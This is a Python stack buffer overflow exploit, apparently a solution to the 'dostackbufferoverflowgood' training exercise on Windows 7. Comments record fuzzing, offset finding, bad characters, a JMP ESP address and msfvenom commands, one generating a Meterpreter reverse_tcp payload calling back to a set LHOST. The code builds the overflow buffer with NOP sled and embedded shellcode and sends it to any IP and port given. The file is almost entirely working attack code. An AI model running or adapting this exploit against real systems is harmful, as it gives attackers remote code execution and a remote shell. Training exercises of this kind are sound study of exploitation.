import socket
import struct
import sys

# code by: SPC Cameron, James (Tantalus)
# my solution to dostackbufferoverflowgood 
# https://github.com/justinsteven/dostackbufferoverflowgood
# tested on: Windows 7 SP1 x86
# https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
#
# [*]Fuzzing 127.0.0.1 31337 with 45302 bytes...
# root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 45300 |xclip -selection clipboard
# root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138
# [*] Exact match at offset 146
# badchars = [0x00,0x0a]
# !mona jmp -r esp -cpb "\x00\x0A"
# Log data, item 4 Address=080414C3 Message=  0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [dostackbufferoverflowgood.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Desktop\dostackbufferoverflowgood-master\dostackbufferoverflowgood-master\dostackbufferoverflowgood
# Log data, item 3 Address=080416BF Message=  0x080416bf : jmp esp |  {PAGE_EXECUTE_READ} [dostackbufferoverflowgood.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\Users\IEUser\Desktop\dostackbufferoverflowgood-master\dostackbufferoverflowgood-master\dostackbufferoverflowgood
# msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode CMD=calc.exe EXITFUNC=thread
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.13 LPORT=443 -b '\x00\x0A' -f python --var-name my_shellcode EXITFUNC=thread

def exploit(user_supplied_shellcode,ip,port=31337):

	jmp_esp = struct.pack("<I",0x080414c3)

	nop_sled =  b"\x90"*30
	shellcode = nop_sled + user_supplied_shellcode
	
	buf = bytearray()
	buf += ("a" *146).encode('ascii')
	buf += jmp_esp
	buf += shellcode
	buf += ("c"*(45300 - len(buf))).encode('ascii')
	buf += "\n".encode('ascii')

	print("[*]Sending evil buf {} {} with {} bytes...".format(ip,port,len(buf)))

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ip,port))
	s.send(buf)
	s.close()

	return

if __name__=="__main__":
	# do magic

	my_shellcode =  b""
	my_shellcode += b"\xba\x3d\xd6\x92\x9e\xdb\xc0\xd9\x74\x24\xf4"
	my_shellcode += b"\x5b\x31\xc9\xb1\x5b\x31\x53\x14\x03\x53\x14"
	my_shellcode += b"\x83\xc3\x04\xdf\x23\x6e\x76\x9d\xcc\x8f\x87"
	my_shellcode += b"\xc1\x45\x6a\xb6\xc1\x32\xfe\xe9\xf1\x31\x52"
	my_shellcode += b"\x06\x7a\x17\x47\x9d\x0e\xb0\x68\x16\xa4\xe6"
	my_shellcode += b"\x47\xa7\x94\xdb\xc6\x2b\xe6\x0f\x29\x15\x29"
	my_shellcode += b"\x42\x28\x52\x57\xaf\x78\x0b\x1c\x02\x6d\x38"
	my_shellcode += b"\x68\x9f\x06\x72\x7d\xa7\xfb\xc3\x7c\x86\xad"
	my_shellcode += b"\x58\x27\x08\x4f\x8c\x5c\x01\x57\xd1\x58\xdb"
	my_shellcode += b"\xec\x21\x17\xda\x24\x78\xd8\x71\x09\xb4\x2b"
	my_shellcode += b"\x8b\x4d\x73\xd3\xfe\xa7\x87\x6e\xf9\x73\xf5"
	my_shellcode += b"\xb4\x8c\x67\x5d\x3f\x36\x4c\x5f\xec\xa1\x07"
	my_shellcode += b"\x53\x59\xa5\x40\x70\x5c\x6a\xfb\x8c\xd5\x8d"
	my_shellcode += b"\x2c\x05\xad\xa9\xe8\x4d\x76\xd3\xa9\x2b\xd9"
	my_shellcode += b"\xec\xaa\x93\x86\x48\xa0\x3e\xd3\xe0\xeb\x56"
	my_shellcode += b"\x10\xc9\x13\xa7\x3e\x5a\x67\x95\xe1\xf0\xef"
	my_shellcode += b"\x95\x6a\xdf\xe8\xac\x7c\xe0\x27\x16\xec\x1e"
	my_shellcode += b"\xc8\x67\x25\xe5\x9c\x37\x5d\xcc\x9c\xd3\x9d"
	my_shellcode += b"\xf1\x48\x49\x97\x65\xb3\x26\xa7\x78\x5b\x35"
	my_shellcode += b"\xa7\x83\x20\xb0\x41\xd3\x06\x93\xdd\x94\xf6"
	my_shellcode += b"\x53\x8d\x7c\x1d\x5c\xf2\x9d\x1e\xb6\x9b\x34"
	my_shellcode += b"\xf1\x6f\xf4\xa0\x68\x2a\x8e\x51\x74\xe0\xeb"
	my_shellcode += b"\x52\xfe\x01\x0c\x1c\xf7\x60\x1e\x49\x60\x8b"
	my_shellcode += b"\xde\x8a\x05\x8b\xb4\x8e\x8f\xdc\x20\x8d\xf6"
	my_shellcode += b"\x2b\xef\x6e\xdd\x2f\xf7\x91\xa0\x19\x8c\xa4"
	my_shellcode += b"\x36\x26\xfa\xc8\xd6\xa6\xfa\x9e\xbc\xa6\x92"
	my_shellcode += b"\x46\xe5\xf4\x87\x88\x30\x69\x14\x1d\xbb\xd8"
	my_shellcode += b"\xc9\xb6\xd3\xe6\x34\xf0\x7b\x18\x13\x82\x7c"
	my_shellcode += b"\xe6\xe6\xad\x24\x8f\x18\xee\xd4\x4f\x72\xee"
	my_shellcode += b"\x84\x27\x89\xc1\x2b\x88\x72\xc8\x63\x80\xf9"
	my_shellcode += b"\x9d\xc6\x31\xfe\xb7\x87\xef\xff\x34\x1c\x1f"
	my_shellcode += b"\x7a\x34\xa3\xe0\x7b\x5c\xc0\xe0\x7c\x60\xf6"
	my_shellcode += b"\xdd\xab\x59\x8c\x20\x68\xde\x8f\xbe\x44\x2b"
	my_shellcode += b"\x38\x67\x0d\x96\x25\x98\xf8\xd5\x53\x1b\x08"
	my_shellcode += b"\xa6\xa7\x03\x79\xa3\xec\x83\x92\xd9\x7d\x66"
	my_shellcode += b"\x94\x4e\x7d\xa3"
	
	usage = "[*]Usage: {} [ip] [port]".format(sys.argv[0])

	if len(sys.argv) != 3:
		print(usage)
		sys.exit()

	ip = sys.argv[1]
	port = sys.argv[2]

	exploit(my_shellcode,str(ip),int(port))

	print("[+]Finished!!!")